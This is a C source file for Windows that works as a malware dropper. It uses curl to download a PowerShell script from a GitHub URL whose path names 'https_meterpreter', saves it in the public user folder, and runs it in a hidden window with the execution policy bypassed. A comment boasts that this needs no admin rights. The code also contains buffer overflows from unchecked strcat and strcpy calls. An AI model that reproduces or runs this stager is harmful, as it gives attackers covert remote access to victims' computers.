#include <stdio.h>
#include <io.h>
#include <windows.h>
#include <stdlib.h>

int main()
{
    char buffer[1024];
    FILE *fp;
    fp = _popen("powershell.exe (Get-CimInstance -ClassName CIM_OperatingSystem).SystemDrive", "r");
    fgets(buffer, 1024, fp);
    _pclose(fp);
    printf(buffer);
    printf("\n");
    // remove new line characters from buffer
    buffer[strcspn(buffer, "\n")] = 0;

    char publicDir[1024] = "\\Users\\Public\\dependencies.ps1";
    char publicDirFull[1024];
    strcpy(publicDirFull, buffer);
    strcat(publicDirFull, publicDir);
    printf(publicDirFull);
    printf("\n");

    char path1[1024] = "curl --output \"";
    char path2[1024] = "\\Users\\Public\\dependencies.ps1\" -LJO https://raw.githubusercontent.com/durandlh/mpr-repo/main/fourth-revision/https_meterpreter/dependencies.ps1";
    // check if file exists in publicdirfull
    if (fopen(publicDirFull, "r") == NULL)
    {
        printf("File does not exist\n");
        // combine path1 and buffer into path3
        strcat(path1, buffer);
        printf(path1);
        printf("\n");
        // combine path1 and path2 into path3
        strcat(path1, path2);
        printf(path1);
        printf("\n");
        printf("\n");

        STARTUPINFO si;
        PROCESS_INFORMATION pi;
        ZeroMemory(&si, sizeof(si));
        si.cb = sizeof(si);
        ZeroMemory(&pi, sizeof(pi));
        CreateProcess(NULL, path1, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
        WaitForSingleObject(pi.hProcess, INFINITE);
    }

    

    printf("\n");
    // assign currentletter to new variable
    char currentLetter2[5];
    memcpy(currentLetter2, buffer, 2);
    printf("\n");
    printf(buffer);
    printf("\n");

    char buffer2[2];
    strcpy(buffer2, buffer);
    printf(buffer2);
    // remove new line character from buffer2
    printf(buffer2);
    printf("\n");

    char powershellCommand[] = "powershell.exe -ExecutionPolicy Bypass -File \"";
    strcat(powershellCommand, buffer2);
    char dependenciesPath[1024] = "\\Users\\Public\\dependencies.ps1\" -WindowStyle Hidden";
    strcat(powershellCommand, dependenciesPath);
    printf(powershellCommand);
    // run powershellCommand in hidden window
    STARTUPINFO si2;
    PROCESS_INFORMATION pi2;
    ZeroMemory(&si2, sizeof(si2));
    si2.cb = sizeof(si2);
    ZeroMemory(&pi2, sizeof(pi2));
    CreateProcess(NULL, powershellCommand, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si2, &pi2);
    WaitForSingleObject(pi2.hProcess, INFINITE);

    // use powershell -ExecutionPolicy BypPass -File "file" to bypass execution policy w/o admin
}

int checkSetup(fname)
{
    if (access(fname, F_OK) == 0)
    {
        return 1;
    }
    else
    {
        return 0;
    }
}